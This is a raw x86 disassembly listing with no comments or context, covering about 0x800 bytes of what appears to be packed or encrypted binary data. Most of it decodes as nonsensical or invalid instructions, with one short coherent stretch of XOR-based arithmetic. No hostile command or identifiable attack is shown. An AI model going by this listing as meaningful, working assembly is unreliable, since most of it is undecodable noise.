  405661:	mov    dl,0x99
  405663:	mov    ds:0x7e157895,al
  405668:	push   cs
  405669:	dec    eax
  40566a:	inc    eax
  40566b:	lock xchg esp,eax
  40566d:	mov    cl,0x9d
  40566f:	inc    eax
  405670:	nop
  405671:	out    0xd8,eax
  405673:	mov    WORD PTR [eax-0x38b49e1],es
  405679:	sub    al,0xef
  40567b:	imul   ecx,DWORD PTR [ebp+0xf],0x22
  40567f:	scas   al,BYTE PTR es:[edi]
  405680:	adc    ecx,DWORD PTR [eax-0x343f734e]
  405686:	rcl    BYTE PTR ds:0xc7d781b0,0xcc
  40568d:	data16 shr BYTE PTR [edi+0xa],1
  405691:	cmp    eax,0x18759bcb
  405696:	sub    ah,BYTE PTR [edi-0x71d1680d]
  40569c:	and    al,0x6c
  40569e:	inc    ebp
  40569f:	mov    bh,al
  4056a1:	shl    DWORD PTR [ecx+0x28],cl
  4056a4:	jbe    0x4056c7
  4056a6:	dec    eax
  4056a7:	and    ebx,ecx
  4056a9:	retf   0xcbdd
  4056ac:	pop    es
  4056ad:	sbb    ebx,eax
  4056af:	jb     0x40565e
  4056b1:	mov    al,ds:0x7e7b5099
  4056b6:	lfs    esi,FWORD PTR [esi+0x79]
  4056ba:	pop    esi
  4056bb:	(bad)  
  4056bc:	enter  0xd3fd,0x4b
  4056c0:	test   BYTE PTR [esp+edx*1+0x66c09c10],bh
  4056c7:	or     DWORD PTR [ebx],esi
  4056c9:	(bad)  
  4056ca:	or     eax,edx
  4056cc:	mov    edx,DWORD PTR [ebp-0x4]
  4056cf:	dec    eax
  4056d0:	not    eax
  4056d2:	jmp    0x405a73
  4056d7:	int    0x14
  4056d9:	mov    ds:0x7ab8a317,eax
  4056de:	sbb    al,0x97
  4056e0:	mov    ah,0x18
  4056e2:	sar    edi,1
  4056e4:	imul   eax,DWORD PTR [edi+ecx*8-0x4141e042],0xffffffbd
  4056ec:	les    edi,FWORD PTR [esi-0x2cbbf242]
  4056f2:	shl    DWORD PTR [esi+0x57],0xfe
  4056f6:	mov    bh,BYTE PTR [ecx-0x17]
  4056f9:	outs   dx,BYTE PTR ds:[esi]
  4056fa:	dec    esp
  4056fb:	cmp    esp,eax
  4056fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056fe:	ror    DWORD PTR [eax+0x4a9b951f],0x4
  405705:	lahf   
  405706:	ds popa 
  405708:	inc    edi
  405709:	scas   eax,DWORD PTR es:[edi]
  40570a:	into   
  40570b:	aaa    
  40570c:	arpl   WORD PTR [bx+di-0x20],bx
  405710:	ret    
  405711:	pop    ebx
  405712:	fisttp WORD PTR [ecx]
  405714:	cmp    bl,BYTE PTR [edx]
  405716:	fwait
  405717:	(bad)  
  405718:	das    
  405719:	xchg   edi,eax
  40571a:	push   esi
  40571b:	loopne 0x405717
  40571d:	pop    ds
  40571e:	xor    eax,0xe3103297
  405723:	pop    ebp
  405724:	dec    ecx
  405725:	sub    dl,BYTE PTR [edi-0x31]
  405728:	clc    
  405729:	inc    eax
  40572a:	add    ebp,DWORD PTR [edi+0x69]
  40572d:	xchg   edi,eax
  40572e:	stos   DWORD PTR es:[edi],eax
  40572f:	popf   
  405730:	(bad)  
  405731:	lock fld QWORD PTR [eax]
  405734:	pop    esp
  405735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405736:	aad    0xb1
  405738:	sub    BYTE PTR [ecx],bl
  40573a:	stos   DWORD PTR es:[edi],eax
  40573b:	push   ebp
  40573c:	add    ebp,edi
  40573e:	mov    esi,0x6eb0fd9b
  405743:	clc    
  405744:	sar    al,1
  405746:	mov    al,0xe1
  405748:	mov    al,ds:0x459ac0d
  40574d:	jne    0x405776
  40574f:	sub    al,0x95
  405751:	cli    
  405752:	das    
  405753:	mov    esi,0x5f4e8af8
  405758:	call   0xcd8cb5bd
  40575d:	xchg   esi,eax
  40575e:	xor    ecx,DWORD PTR [esi*2-0x2c54ff5c]
  405765:	sahf   
  405766:	add    BYTE PTR [esi+0x42],al
  405769:	fisubr DWORD PTR [ebx+0x2c]
  40576c:	(bad)  
  40576e:	jno    0x405793
  405770:	pop    es
  405771:	xchg   BYTE PTR [edx+0x430d68a8],bh
  405777:	ret    
  405778:	push   esi
  405779:	sub    DWORD PTR [ebx],esi
  40577b:	loope  0x4057b2
  40577d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40577e:	(bad)  
  40577f:	daa    
  405780:	loopne 0x405716
  405782:	clc    
  405783:	ins    DWORD PTR es:[edi],dx
  405784:	fcomp  DWORD PTR [ecx+0x56]
  405787:	dec    ebx
  405788:	add    esi,DWORD PTR [esi]
  40578a:	loop   0x405727
  40578c:	dec    esi
  40578d:	mov    WORD PTR [eax+0x29aac334],gs
  405793:	jmp    0x4057bb
  405795:	xchg   edx,eax
  405796:	adc    BYTE PTR [esp+esi*2-0x1ebec162],ch
  40579d:	sbb    DWORD PTR [ecx+0x3d2ed3e9],edi
  4057a3:	jbe    0x4057df
  4057a5:	xchg   ebp,eax
  4057a6:	es (bad) 
  4057a8:	adc    DWORD PTR [eax+0x1a],edi
  4057ab:	inc    ebx
  4057ac:	jb     0x405744
  4057ae:	mov    ebx,DWORD PTR [eax-0xef41356]
  4057b4:	test   al,0x8b
  4057b6:	mov    edi,0xc4e8a7a7
  4057bb:	fidiv  WORD PTR [edx+eax*1]
  4057be:	push   0xd8e22df3
  4057c3:	push   esi
  4057c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057c5:	pop    ebp
  4057c6:	jns    0x405826
  4057c8:	sahf   
  4057c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ca:	loopne 0x4057ee
  4057cc:	pusha  
  4057cd:	sahf   
  4057ce:	out    dx,al
  4057cf:	adc    BYTE PTR [ecx+esi*2],0x37
  4057d3:	cmp    dl,BYTE PTR [edx-0x5a88f865]
  4057d9:	mov    ch,0x8b
  4057db:	popf   
  4057dc:	xlat   BYTE PTR ds:[ebx]
  4057dd:	pop    ds
  4057de:	sub    al,0x3
  4057e0:	mov    eax,ecx
  4057e2:	lea    esp,[ebx+0x40]
  4057e5:	jl     0x4057c7
  4057e7:	cmc    
  4057e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057e9:	and    DWORD PTR [edi+0x3dad8234],eax
  4057ef:	ds xchg ecx,eax
  4057f1:	or     al,0x9e
  4057f3:	adc    al,0x70
  4057f5:	push   ebp
  4057f6:	mov    eax,ds:0x213d5378
  4057fb:	(bad)  
  4057fc:	clc    
  4057fd:	push   es
  4057fe:	inc    eax
  4057ff:	xor    dl,BYTE PTR es:[esp+edx*1-0x6]
  405804:	add    esp,ecx
  405806:	call   0xdfe98aff
  40580b:	pop    ds
  40580c:	mov    bl,0xd2
  40580e:	into   
  40580f:	mov    esp,0xd336c593
  405814:	push   edi
  405815:	xchg   edx,eax
  405816:	xor    eax,0xc0063580
  40581b:	cs cmp al,0x74
  40581e:	test   DWORD PTR [ebp+0x3b],ebx
  405821:	lea    eax,[eax+0x9f19cfc]
  405827:	mov    bh,al
  405829:	jge    0x4057d1
  40582b:	sbb    al,BYTE PTR [edi]
  40582d:	scas   eax,DWORD PTR es:[edi]
  40582e:	mov    bh,0x41
  405830:	fdivr  st,st(3)
  405832:	dec    esi
  405833:	ret    
  405834:	inc    ebp
  405835:	pop    esp
  405836:	sahf   
  405837:	shl    DWORD PTR [esi-0x6c],1
  40583a:	lods   eax,DWORD PTR ds:[esi]
  40583b:	dec    ebx
  40583c:	add    al,0x81
  40583e:	test   eax,0xaa4bd110
  405843:	mov    eax,0x1f2fb4f6
  405848:	mov    ds:0x301ecbca,eax
  40584d:	sub    ch,BYTE PTR ds:[ebx-0x6446218a]
  405854:	stc    
  405855:	rol    esp,cl
  405857:	jne    0x40583e
  405859:	fmul   st(0),st
  40585b:	sbb    esi,esp
  40585d:	fidiv  WORD PTR [ecx+0x14293082]
  405863:	adc    BYTE PTR [ebp-0x28],dh
  405866:	push   ss
  405867:	pop    eax
  405868:	pop    edi
  405869:	mov    bl,0x22
  40586b:	pop    ds
  40586c:	cmp    BYTE PTR [edi-0x27],bh
  40586f:	stos   BYTE PTR es:[edi],al
  405870:	sub    BYTE PTR [edi+0x431966cc],bh
  405876:	repz pop edx
  405878:	mov    DWORD PTR ds:0x483cd7d3,ebp
  40587e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587f:	adc    edi,esp
  405881:	xchg   ecx,eax
  405882:	ins    BYTE PTR es:[edi],dx
  405883:	inc    eax
  405884:	mov    eax,0xb35f18fb
  405889:	pop    edi
  40588a:	call   0xee5e17fd
  40588f:	inc    eax
  405890:	or     eax,0x9c1354f5
  405895:	push   edi
  405896:	hlt    
  405897:	xor    esi,edi
  405899:	aad    0xd6
  40589b:	outs   dx,DWORD PTR ds:[esi]
  40589c:	sub    ebx,DWORD PTR [edx-0x3]
  40589f:	pusha  
  4058a0:	pop    ss
  4058a1:	stos   DWORD PTR es:[edi],eax
  4058a2:	sbb    al,0xab
  4058a4:	mov    ah,BYTE PTR [edi+eax*1]
  4058a7:	aas    
  4058a8:	ins    DWORD PTR es:[edi],dx
  4058a9:	jne    0x405928
  4058ab:	mov    eax,ds:0x6c7c7d14
  4058b0:	sahf   
  4058b1:	inc    edx
  4058b2:	in     eax,dx
  4058b3:	repz or BYTE PTR [ecx+0x23],ah
  4058b7:	add    DWORD PTR [ecx-0x413063bc],esi
  4058bd:	repz cs call 0x69ec:0x2b9a6697
  4058c6:	cmp    ch,dh
  4058c8:	cmp    bh,al
  4058ca:	add    eax,0x68f65475
  4058cf:	add    DWORD PTR [ecx],ebp
  4058d1:	pushf  
  4058d2:	jns    0x4058f6
  4058d4:	cli    
  4058d5:	and    eax,0x97681fcc
  4058da:	xchg   esi,eax
  4058db:	data16 scas al,BYTE PTR es:[edi]
  4058dd:	aas    
  4058de:	jecxz  0x405926
  4058e0:	mov    edx,0x92c91f61
  4058e5:	sub    ecx,DWORD PTR ds:0x384cb95e
  4058eb:	mov    esi,0x9ed05c1
  4058f0:	cdq    
  4058f1:	ror    eax,cl
  4058f3:	push   cs
  4058f4:	sti    
  4058f5:	and    cl,BYTE PTR [eax]
  4058f7:	jb     0x40588c
  4058f9:	fwait
  4058fa:	sbb    edx,DWORD PTR [ebx+0x37]
  4058fd:	popf   
  4058fe:	in     al,dx
  4058ff:	jne    0x40593f
  405901:	dec    ebp
  405902:	pop    esp
  405903:	(bad)  [eax+0x2b1ed26c]
  405909:	jl     0x4058fd
  40590b:	pop    eax
  40590c:	loopne 0x40589c
  40590e:	ret    0xc0d1
  405911:	inc    ebx
  405912:	in     al,0xb2
  405914:	sbb    bl,dh
  405916:	push   ebx
  405917:	int3   
  405918:	cld    
  405919:	ss inc esp
  40591b:	test   eax,0x6500459e
  405920:	popf   
  405921:	inc    edi
  405922:	popf   
  405923:	pop    edi
  405924:	or     DWORD PTR [ebx+eiz*2],0x615ba380
  40592b:	mov    ch,0xc1
  40592d:	mov    edx,0x5522227c
  405932:	int    0x67
  405934:	icebp  
  405935:	repnz or eax,0x2510cdf1
  40593b:	loope  0x405933
  40593d:	popa   
  40593e:	xchg   edi,eax
  40593f:	mov    dl,0x1e
  405941:	xlat   BYTE PTR ds:[ebx]
  405942:	xchg   esi,eax
  405943:	(bad)  
  405944:	repz arpl si,ax
  405947:	je     0x4058ef
  405949:	and    dl,BYTE PTR [ecx-0x495d6163]
  40594f:	shl    DWORD PTR [esi+0x49],0xa9
  405953:	add    DWORD PTR [edx-0x53aab086],edi
  405959:	jge    0x4058db
  40595b:	jnp    0x405991
  40595d:	out    dx,al
  40595e:	stc    
  40595f:	mov    ecx,0xdcc04583
  405964:	pop    ss
  405965:	add    ch,BYTE PTR [ebx-0xc3d54fb]
  40596b:	arpl   WORD PTR [edx+0x1b],si
  40596e:	xchg   ebx,eax
  40596f:	xchg   DWORD PTR [ebp+0x72],esi
  405972:	or     bl,dh
  405974:	ror    BYTE PTR ds:0xa4e4d051,0x59
  40597b:	mov    es,ebx
  40597d:	lds    ebp,FWORD PTR [ebp-0x5a]
  405980:	sbb    BYTE PTR [edi],cl
  405982:	push   0xfffffff6
  405984:	nop
  405985:	pop    ss
  405986:	and    eax,0x29cdf845
  40598b:	mov    ebp,0x6726665e
  405990:	sahf   
  405991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405992:	popf   
  405993:	dec    esp
  405994:	test   BYTE PTR [ecx-0x1],al
  405997:	nop
  405998:	rol    BYTE PTR [esi+0x18],0x6e
  40599c:	or     al,0x51
  40599e:	call   0x954454d3
  4059a3:	(bad)  
  4059a4:	jae    0x405970
  4059a6:	mov    bl,0x3
  4059a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a9:	jnp    0x4059a0
  4059ab:	add    dl,0xe7
  4059ae:	ret    0xe82a
  4059b1:	ins    DWORD PTR es:[edi],dx
  4059b2:	add    ch,BYTE PTR [ecx]
  4059b4:	jns    0x4059eb
  4059b6:	xlat   BYTE PTR ds:[ebx]
  4059b7:	mov    ?,WORD PTR [esi-0x76312c33]
  4059bd:	push   es
  4059be:	mov    ebp,0xc64bd49
  4059c3:	cmp    DWORD PTR [ebx+0x13],esi
  4059c6:	je     0x405a3d
  4059c8:	and    DWORD PTR [eax-0x14],0x4d
  4059cc:	push   es
  4059cd:	outs   dx,BYTE PTR ds:[esi]
  4059ce:	xor    esi,DWORD PTR [eax]
  4059d0:	xchg   ebx,eax
  4059d1:	mov    bl,0x2
  4059d3:	xchg   edx,eax
  4059d4:	or     al,0xf8
  4059d6:	add    BYTE PTR [edx],bh
  4059d8:	cmc    
  4059d9:	mov    al,dl
  4059db:	xchg   edx,eax
  4059dc:	inc    ebx
  4059dd:	adc    eax,0x75589d51
  4059e2:	mov    ah,0x98
  4059e4:	sbb    BYTE PTR [esi+0x2e],ch
  4059e7:	and    al,al
  4059e9:	xchg   ebp,eax
  4059ea:	in     al,0x99
  4059ec:	jmp    0x405a61
  4059ee:	push   0xe913aae0
  4059f3:	fisubr WORD PTR [eax-0x21]
  4059f6:	jle    0x4059f5
  4059f8:	dec    ecx
  4059f9:	xchg   ebp,eax
  4059fa:	lea    esi,[edi-0x1cb306dc]
  405a00:	data16 test BYTE PTR [ebp*4-0x3247fd25],0xfd
  405a09:	and    BYTE PTR [edi+0x1b3c9106],0x19
  405a10:	std    
  405a11:	or     edx,esp
  405a13:	cmp    BYTE PTR [ecx],bh
  405a15:	jbe    0x405a39
  405a17:	test   eax,0xef651e41
  405a1c:	adc    DWORD PTR [edx-0x3a45645f],0xd130821f
  405a26:	dec    ecx
  405a27:	ret    0xfd6b
  405a2a:	adc    BYTE PTR [eax],al
  405a2c:	or     al,0x93
  405a2e:	sub    al,0x45
  405a30:	pop    eax
  405a31:	mov    eax,0xfe3d2fda
  405a36:	adc    DWORD PTR [esi+0x3],esp
  405a39:	out    dx,eax
  405a3a:	push   eax
  405a3b:	adc    dh,dh
  405a3d:	nop
  405a3e:	(bad)  
  405a3f:	(bad)  
  405a40:	fist   DWORD PTR [ebx+edx*4]
  405a43:	sti    
  405a44:	or     BYTE PTR [esi+0x0],dl
  405a47:	adc    eax,0xee7618a8
  405a4c:	mov    esp,0xe1cfb8fc
  405a51:	ins    BYTE PTR es:[edi],dx
  405a52:	sbb    dh,ah
  405a54:	cmc    
  405a55:	aam    0x4e
  405a57:	cwde   
  405a58:	adc    al,0x3c
  405a5a:	pop    es
  405a5b:	mov    eax,DWORD PTR [eax]
  405a5d:	and    BYTE PTR [ebp+0x50],al
  405a60:	test   BYTE PTR [esi+0x163dbdfd],dh
  405a66:	(bad)  [edi-0x18]
  405a69:	dec    ebx
  405a6a:	mov    ch,0x99
  405a6c:	rcr    DWORD PTR [ebp+0x3],1
  405a6f:	pop    es
  405a70:	inc    esi
  405a71:	mov    esp,0x33c22388
  405a76:	iret   
  405a77:	mov    DWORD PTR [ebp-0x4],eax
  405a7a:	mov    DWORD PTR [ebp+0x14],ecx
  405a7d:	xor    eax,eax
  405a7f:	or     DWORD PTR [ebp+0x14],eax
  405a82:	mov    eax,DWORD PTR [ebp-0x50]
  405a85:	mov    ecx,DWORD PTR [ebp-0x4c]
  405a88:	shrd   eax,ecx,0x2
  405a8c:	shr    ecx,0x2
  405a8f:	mov    cx,ax
  405a92:	mov    eax,DWORD PTR [ebp-0x50]
  405a95:	mov    edx,0x6d5d
  405a9a:	xor    cx,dx
  405a9d:	mov    edx,DWORD PTR [ebp-0x4c]
  405aa0:	xor    edx,edx
  405aa2:	shl    eax,0x1e
  405aa5:	mov    ax,dx
  405aa8:	or     ax,cx
  405aab:	mov    ecx,DWORD PTR [ebp-0x4]
  405aae:	cmp    WORD PTR [ecx],ax
  405ab1:	je     0x406288
  405ab7:	mov    eax,DWORD PTR [ebp+0x14]
  405aba:	sub    DWORD PTR [ebp-0x4],eax
  405abd:	mov    eax,DWORD PTR [esi]
  405abf:	jmp    0x405e60
  405ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac5:	test   eax,0x3c522b52
  405aca:	mov    eax,0x46ddf0ac
  405acf:	xchg   edx,eax
  405ad0:	loope  0x405a68
  405ad2:	clc    
  405ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ad4:	mov    ebp,0xbdbebe25
  405ad9:	les    edi,FWORD PTR [esi-0x60e87742]
  405adf:	xchg   ebx,eax
  405ae0:	cmp    eax,0x51f58954
  405ae5:	test   eax,ecx
  405ae7:	push   ss
  405ae8:	jmp    0x6dc57386
  405aed:	pop    ds
  405aee:	jne    0x405b52
  405af0:	(bad)  
  405af1:	mov    bl,0x11
  405af3:	sbb    al,al
  405af5:	(bad)  
  405af6:	pop    esi
  405af7:	in     al,dx
  405af8:	lock pop edi
  405afa:	xchg   ecx,eax
  405afb:	enter  0xa80a,0xf7
  405aff:	add    eax,0xf79a47b7
  405b04:	cs cmc 
  405b06:	inc    ecx
  405b07:	cmp    dl,BYTE PTR [esi]
  405b09:	(bad)  
  405b0a:	(bad)  
  405b0b:	fnsave [eax-0xac6c98b]
  405b11:	enter  0xf04,0x6d
  405b15:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  405b17:	inc    ebp
  405b18:	mov    ecx,0xd262b02c
  405b1d:	jecxz  0x405af7
  405b1f:	mov    dl,0x39
  405b21:	or     edx,DWORD PTR [eax]
  405b23:	outs   dx,DWORD PTR ds:[esi]
  405b24:	call   0x6e91e9a8
  405b29:	ss push es
  405b2b:	push   es
  405b2c:	outs   dx,BYTE PTR ds:[esi]
  405b2d:	dec    esi
  405b2e:	out    0xdc,al
  405b30:	shl    esi,0x90
  405b33:	xor    BYTE PTR [ebx-0x4ff4316d],ah
  405b39:	dec    eax
  405b3a:	cmp    dl,BYTE PTR [edi+0x17]
  405b3d:	adc    esi,DWORD PTR [ebp+ebx*8-0x4660faa3]
  405b44:	mov    al,dl
  405b46:	sub    DWORD PTR [ecx+0x2ac5e148],ebx
  405b4c:	pop    ss
  405b4d:	adc    al,0xfc
  405b4f:	and    BYTE PTR ds:0x4712a94a,0x2b
  405b56:	retf   
  405b57:	pop    ebp
  405b58:	xor    DWORD PTR [eax],ebp
  405b5a:	inc    ecx
  405b5b:	aas    
  405b5c:	lock cmp BYTE PTR [edi],bh
  405b5f:	(bad)  
  405b60:	loop   0x405b71
  405b62:	out    0x30,al
  405b64:	pop    esi
  405b65:	mov    ebx,edi
  405b67:	mov    esi,DWORD PTR [ecx]
  405b69:	test   eax,0xc9ffa3c0
  405b6e:	(bad)  
  405b70:	or     BYTE PTR [edi-0x39],ch
  405b73:	mov    ch,0xa7
  405b75:	sahf   
  405b76:	paddq  mm1,QWORD PTR [ebx]
  405b79:	pusha  
  405b7a:	or     DWORD PTR [esi],esp
  405b7c:	or     bl,BYTE PTR [eax]
  405b7e:	fbld   TBYTE PTR [ebx]
  405b80:	sahf   
  405b81:	pop    esp
  405b82:	adc    dl,BYTE PTR [eax]
  405b84:	ficomp DWORD PTR [edx+0x5d]
  405b87:	sub    ebp,DWORD PTR [eax-0xc]
  405b8a:	(bad)  
  405b8b:	jno    0x405b1c
  405b8d:	pop    esp
  405b8e:	ror    BYTE PTR [edi-0x72f200c6],0x24
  405b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b96:	setno  BYTE PTR [eax+0x3a]
  405b9a:	xor    edi,esp
  405b9c:	stos   DWORD PTR es:[edi],eax
  405b9d:	ret    0x4ade
  405ba0:	shl    edx,1
  405ba2:	retf   0x53ef
  405ba5:	call   0x76c7:0xc1be9dc0
  405bac:	pop    eax
  405bad:	and    dh,BYTE PTR [edx+0x23]
  405bb0:	loop   0x405c30
  405bb2:	sti    
  405bb3:	mov    eax,ds:0x19f0c622
  405bb8:	jnp    0x405bea
  405bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bbb:	dec    ebx
  405bbc:	sub    edi,DWORD PTR [ebp+0x71]
  405bbf:	idiv   BYTE PTR [edx]
  405bc1:	or     ch,BYTE PTR [edi+0x27ea8141]
  405bc7:	push   edi
  405bc8:	mov    al,0xae
  405bca:	cwde   
  405bcb:	ja     0x405bef
  405bcd:	aam    0xf9
  405bcf:	cmc    
  405bd0:	pop    es
  405bd1:	xor    DWORD PTR [edi-0x6f],0x7d135bb1
  405bd8:	push   esi
  405bd9:	scas   eax,DWORD PTR es:[edi]
  405bda:	mov    ecx,0xe9b2d95d
  405bdf:	or     ah,cl
  405be1:	loopne 0x405b92
  405be3:	in     eax,dx
  405be4:	repnz sub edi,edx
  405be7:	ja     0x405c22
  405be9:	jge    0x405ba7
  405beb:	mov    bh,0xc3
  405bed:	push   ecx
  405bee:	pop    edi
  405bef:	enter  0xfd2,0x7a
  405bf3:	pop    ss
  405bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bf5:	imul   esp,DWORD PTR [ecx],0x7c2e35a6
  405bfb:	dec    edi
  405bfc:	repz and ah,BYTE PTR [esi-0x3560f078]
  405c03:	ficom  DWORD PTR [edi+ecx*4]
  405c06:	sub    eax,0x286c72a4
  405c0b:	push   edx
  405c0c:	sbb    DWORD PTR [esi-0x3f2e61c2],ebx
  405c12:	sbb    al,0xfa
  405c14:	add    ebx,DWORD PTR [esi+eax*2]
  405c17:	push   0x9008afeb
  405c1c:	lods   al,BYTE PTR ds:[esi]
  405c1d:	xor    ch,al
  405c1f:	mov    edx,0xd0330fbd
  405c24:	jl     0x405bf8
  405c26:	cmp    al,0x9a
  405c28:	add    al,bh
  405c2a:	das    
  405c2b:	jecxz  0x405c26
  405c2d:	add    edi,DWORD PTR [edx]
  405c2f:	push   cs
  405c30:	addr16 inc esi
  405c32:	inc    ebx
  405c33:	and    al,0xd2
  405c35:	xchg   ebx,eax
  405c36:	push   edx
  405c37:	or     eax,edi
  405c39:	(bad)  
  405c3a:	sbb    eax,0x2171ecc
  405c3f:	adc    BYTE PTR [ecx],bl
  405c41:	popf   
  405c42:	xchg   ebp,eax
  405c43:	sbb    al,0x3f
  405c45:	inc    ebx
  405c46:	cld    
  405c47:	rcl    esp,cl
  405c49:	jp     0x405bff
  405c4b:	push   ss
  405c4c:	ret    
  405c4d:	fiadd  DWORD PTR [esi]
  405c4f:	mov    ds:0x2f33d6ec,eax
  405c54:	ins    BYTE PTR es:[edi],dx
  405c55:	(bad)  
  405c56:	push   ecx
  405c57:	mov    bl,0x59
  405c59:	inc    edx
  405c5a:	imul   edi,eax,0x1aa7770c
  405c60:	mov    edx,0xab590928
  405c65:	xchg   ebp,eax
  405c66:	jl     0x405cc1
  405c68:	or     edx,DWORD PTR [ebx-0x1a]
  405c6b:	jb     0x405cbf
  405c6d:	mov    ebp,0x7579e589
  405c72:	ret    0xcc8
  405c75:	sbb    cl,BYTE PTR [ecx+0x48]
  405c78:	in     al,0x34
  405c7a:	mov    bl,0x2f
  405c7c:	push   esp
  405c7d:	fcomp  st(4)
  405c7f:	daa    
  405c80:	sbb    bh,al
  405c82:	out    dx,eax
  405c83:	add    eax,0xdffd5dbe
  405c88:	or     eax,0x9ed9d118
  405c8d:	xchg   esi,eax
  405c8e:	push   cs
  405c8f:	icebp  
  405c90:	mov    dl,al
  405c92:	adc    bl,BYTE PTR [eax]
  405c94:	sti    
  405c95:	iret   
  405c96:	mov    WORD PTR [eax-0x5e],fs
  405c99:	inc    ebp
  405c9a:	repz mov eax,ds:0x3d8b893
  405ca0:	jne    0x405c2f
  405ca2:	adc    al,0xa2
  405ca4:	bound  ecx,QWORD PTR [eax]
  405ca6:	mov    dh,0xb8
  405ca8:	repz dec ebx
  405caa:	arpl   WORD PTR [eax-0x75],bp
  405cad:	shl    BYTE PTR [ecx],cl
  405caf:	clc    
  405cb0:	jae    0x405cd6
  405cb2:	or     ecx,edi
  405cb4:	and    DWORD PTR [ebx+0x142e48e6],edi
  405cba:	ficom  WORD PTR [eax-0x49]
  405cbd:	inc    eax
  405cbe:	xor    ah,BYTE PTR [esi]
  405cc0:	cmc    
  405cc1:	and    al,0xaa
  405cc3:	cwde   
  405cc4:	rol    al,cl
  405cc6:	(bad)  
  405cc8:	pop    ecx
  405cc9:	cmp    dl,BYTE PTR [ebx-0x57]
  405ccc:	mov    eax,ds:0x2233a09b
  405cd1:	(bad)  
  405cd2:	mov    ch,0x1b
  405cd4:	mov    DWORD PTR [ecx+0xf8e4ce6],esp
  405cda:	outs   dx,BYTE PTR ds:[esi]
  405cdb:	aad    0xc7
  405cdd:	mov    ebx,0x17ab7cd8
  405ce2:	repz inc ebx
  405ce4:	sar    DWORD PTR [edx-0xcb9b723],cl
  405cea:	mov    ebp,0x4c0d73b2
  405cef:	adc    edx,DWORD PTR cs:[ebx]
  405cf2:	imul   esp,DWORD PTR [ebp-0x27007aa9],0xffffff86
  405cf9:	aam    0xca
  405cfb:	xlat   BYTE PTR ds:[ebx]
  405cfc:	inc    ebp
  405cfd:	mov    eax,0xa9a54a10
  405d02:	fldpi  
  405d04:	mov    ds:0xfa32b95d,eax
  405d09:	pop    ebx
  405d0a:	mov    bh,dl
  405d0c:	ret    
  405d0d:	and    eax,0x3f3b553f
  405d12:	jge    0x405d3f
  405d14:	dec    eax
  405d15:	cli    
  405d16:	mov    al,0xaa
  405d18:	adc    DWORD PTR [esi-0x4c],esi
  405d1b:	mov    ds:0x148bcfff,eax
  405d20:	into   
  405d21:	and    ebx,DWORD PTR [ebp+0x1e0e8c44]
  405d27:	call   0x50c16a4f
  405d2c:	push   0xffffffaa
  405d2e:	pop    ebx
  405d2f:	xchg   ebx,eax
  405d30:	xchg   ecx,eax
  405d31:	xchg   BYTE PTR fs:[ebx-0x69],bl
  405d35:	outs   dx,BYTE PTR ds:[esi]
  405d36:	loope  0x405d9e
  405d38:	leave  
  405d39:	mov    ebp,0xd5782b15
  405d3e:	push   edx
  405d3f:	ds push edx
  405d41:	jo     0x405d71
  405d43:	in     eax,0xe6
  405d45:	inc    ebx
  405d46:	dec    edx
  405d47:	stc    
  405d48:	mov    ?,WORD PTR [ebx-0x7d2cf560]
  405d4e:	dec    ebx
  405d4f:	iret   
  405d50:	jge    0x405d6e
  405d52:	mov    cl,0xde
  405d54:	enter  0x3a5f,0xe0
  405d58:	mov    esi,0xc8371db3
  405d5d:	xor    ch,0xf4
  405d60:	sar    edx,cl
  405d62:	sub    ecx,esi
  405d64:	sbb    DWORD PTR [ebp-0x1f],0x39edd37a
  405d6b:	fcomp  QWORD PTR [edi]
  405d6d:	icebp  
  405d6e:	jmp    0x9a42:0x8a9ba8b2
  405d75:	std    
  405d76:	fwait
  405d77:	lods   al,BYTE PTR ds:[esi]
  405d78:	(bad)  [esi-0x7b]
  405d7b:	jns    0x405df6
  405d7d:	mov    eax,ds:0x6225324d
  405d82:	mov    BYTE PTR ds:0xf2171f7c,ch
  405d88:	add    ebx,ecx
  405d8a:	xor    al,0x1
  405d8c:	hlt    
  405d8d:	jne    0x405d20
  405d8f:	pop    esp
  405d90:	pop    edx
  405d91:	(bad)  
  405d93:	cwde   
  405d94:	xchg   edx,eax
  405d95:	addr16 xchg ecx,eax
  405d97:	pop    ds
  405d98:	mov    bh,0x91
  405d9a:	lock fsub st,st(3)
  405d9d:	push   0x9db898f
  405da2:	sbb    DWORD PTR [esi+0x27887777],ebp
  405da8:	or     esi,DWORD PTR [eax-0x3df116c6]
  405dae:	and    BYTE PTR [eax],bh
  405db0:	and    esp,DWORD PTR [esi-0x7d]
  405db3:	hlt    
  405db4:	mov    ebx,0x19e8c641
  405db9:	mov    dl,0x95
  405dbb:	daa    
  405dbc:	fs jl  0x405dd1
  405dbf:	xor    edi,eax
  405dc1:	mov    esi,0xd21e9350
  405dc6:	push   0x636269d1
  405dcb:	or     DWORD PTR [esi],ebx
  405dcd:	dec    esp
  405dce:	mov    ch,0xfe
  405dd0:	push   cs
  405dd1:	div    al
  405dd3:	lods   al,BYTE PTR ds:[esi]
  405dd4:	mov    al,0xf1
  405dd6:	loope  0x405d7f
  405dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dd9:	cdq    
  405dda:	jle    0x405d97
  405ddc:	push   esi
  405ddd:	mov    ebp,DWORD PTR [eax-0x49]
  405de0:	mov    ebx,0xad83117a
  405de5:	jae    0x405e39
  405de7:	test   eax,0xff68a0d4
  405dec:	cs jnp 0x405dd0
  405def:	mov    esi,0xb147ee23
  405df4:	adc    eax,0x96553a38
  405df9:	add    DWORD PTR [eax+0x7c],0xc3eda45f
  405e00:	scas   eax,DWORD PTR es:[edi]
  405e01:	pushf  
  405e02:	jns    0x405e22
  405e04:	jecxz  0x405e09
  405e06:	inc    ebp
